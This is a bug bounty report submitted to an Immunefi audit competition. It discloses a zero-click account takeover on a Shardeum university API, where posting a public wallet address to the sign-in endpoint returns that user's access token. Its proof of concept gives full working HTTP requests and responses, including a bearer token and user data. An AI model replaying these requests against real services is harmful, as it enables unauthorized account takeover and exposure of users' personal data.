# #35447 \[W\&A-High] Zero Click Full Account Takeover

**Submitted on Sep 22nd 2024 at 22:14:01 UTC by @blocksmith0 for** [**Audit Comp | Shardeum: Ancillaries II**](https://immunefi.com/audit-competition/shardeum-ancillaries-ii-boost)

* **Report ID:** #35447
* **Report Type:** Websites and Applications
* **Report severity:** High
* **Target:** <https://immunefi.com>
* **Impacts:**
  * Changing sensitive details of other users (including modifying browser local storage) without already-connected wallet interaction and with up to one click of user interaction, such as: Email Password of the victim etc.

## Description

## Vulnerability Details

Found a zero click full account takeover on \`api.university.shardeum.org\` which enables any user to fully takeover other users account with zero interaction.

When you pass \`walletAddress\` to the following HTTP POST request it gives access token to that account you can use that access token to take over the account. Because wallet address are public and when someone use the wallet to sign in to \`university.shardeum.org\` by just knowing wallet address we can takeover full account or we can get wallet addresses from the explorers and check all the wallets to find the one wallet that was used to sign in to \`university.shardeum.org\`.

HTTP Request:

\`\`\` POST /api/auth/signin HTTP/1.1 Host: api.university.shardeum.org Connection: close Content-Length: 62 sec-ch-ua: "Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121" Accept: application/json, text/plain, */* Content-Type: application/json sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 sec-ch-ua-platform: "Linux" Origin: <https://165.232.189.24> Sec-Fetch-Site: cross-site Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: <https://165.232.189.24/> Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9

{"walletAddress":"Victim Wallet Address"} \`\`\`

In response you will get all user information including access token.

\`\`\` HTTP/1.1 200 OK Server: nginx/1.24.0 (Ubuntu) Date: Sun, 22 Sep 2024 21:54:13 GMT Content-Type: application/json; charset=utf-8 Content-Length: 678 Connection: close X-Powered-By: Express Access-Control-Allow-Origin: \* Access-Control-Allow-Headers: x-access-token, Origin, Content-Type, Accept ETag: W/"2a6-aaAo1gqpkCEbZ5bZjkBVAmCmGoQ" Vary: Accept-Encoding

{"type":"not-verified","\_id":"66f08643f519db4c16f3ad23","username":"hacked","walletAddress":"0x17daeE6958a71F4854d6359E88013663F439B499","email":"<victim@gmail.com>","isVerified":false,"isBlocked":false,"displayName":"default","portfolio":"<https://sample.com/link","shardId":"areer333","designation":"developer","roles":\\[{"\\_id":"6564d2c72c178bc331526b9e","name":"user"}],"projects":\\[],"enrolledCourses":\\[],"createdAt":"2024-09-22T21:04:03.306Z","updatedAt":"2024-09-22T21:12:21.393Z","\\_\\_v":1,"accessToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY2ZjA4NjQzZjUxOWRiNGMxNmYzYWQyMyIsImlhdCI6MTcyNzA0MjA1MywiZXhwIjoxNzI3MTI4NDUzfQ.6NZ6-pVvFe4xD5QueL-gkoPmTmg68N6kK3B7\\_e7S1Sc"}> \`\`\`

## Proof of Concept

## Proof of Concept

First find victim wallet address using the above technique get victim access token to check that the access token is valid use the following HTTP request to get user information using the access token that you retrieved.

First use the following request without access token and check that you get \`401 Unauthorized\` and then use the access token and user ID from the previous technique that I have discussed you will see that you get all the user information and also you can fully take over the account with user interaction.

HTTP Request without access token.

\`\`\` GET /api/auth/getUserData?userid=66f07c16f519db4c16f3a835 HTTP/1.1 Host: api.university.shardeum.org Connection: close Content-Length: 0 sec-ch-ua: "Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121" Accept: application/json, text/plain, */* Content-Type: application/json sec-ch-ua-mobile: ?0 Authorization: Bearer User-Agent: Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 sec-ch-ua-platform: "Linux" Origin: <https://165.232.189.24> Sec-Fetch-Site: cross-site Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: <https://165.232.189.24/> Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 \`\`\`

The response is \`401 Unauthorized\`

HTTP request with the access token that we got from previous technique.

\`\`\` GET /api/auth/getUserData?userid=66f07c16f519db4c16f3a835 HTTP/1.1 Host: api.university.shardeum.org Connection: close Content-Length: 0 sec-ch-ua: "Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121" Accept: application/json, text/plain, */* Content-Type: application/json sec-ch-ua-mobile: ?0 Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY2ZjA4NjQzZjUxOWRiNGMxNmYzYWQyMyIsImlhdCI6MTcyNzA0MjA1MywiZXhwIjoxNzI3MTI4NDUzfQ.6NZ6-pVvFe4xD5QueL-gkoPmTmg68N6kK3B7\_e7S1Sc User-Agent: Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 sec-ch-ua-platform: "Linux" Origin: <https://165.232.189.24> Sec-Fetch-Site: cross-site Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: <https://165.232.189.24/> Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 \`\`\`

Response is \`200 OK\` with user information meaning we fully takeover the account.

\`\`\` HTTP/1.1 200 OK Server: nginx/1.24.0 (Ubuntu) Date: Sun, 22 Sep 2024 22:05:11 GMT Content-Type: application/json; charset=utf-8 Content-Length: 487 Connection: close X-Powered-By: Express Access-Control-Allow-Origin: \* Access-Control-Allow-Headers: x-access-token, Origin, Content-Type, Accept ETag: W/"1e7-gCZlpAihmY6fwcut90ISYxhSuOw" Vary: Accept-Encoding

{"type":"user-data","\_id":"66f08643f519db4c16f3ad23","username":"hacked","walletAddress":"0x17daeE6958a71F4854d6359E88013663F439B499","email":"<victim@gmail.com>","isVerified":false,"isBlocked":false,"displayName":"default","portfolio":"<https://sample.com/link","shardId":"areer333","designation":"developer","roles":\\[{"\\_id":"6564d2c72c178bc331526b9e","name":"user"}],"projects":\\[],"enrolledCourses":\\[],"createdAt":"2024-09-22T21:04:03.306Z","updatedAt":"2024-09-22T21:12:21.393Z","\\_\\_v":1}> \`\`\`
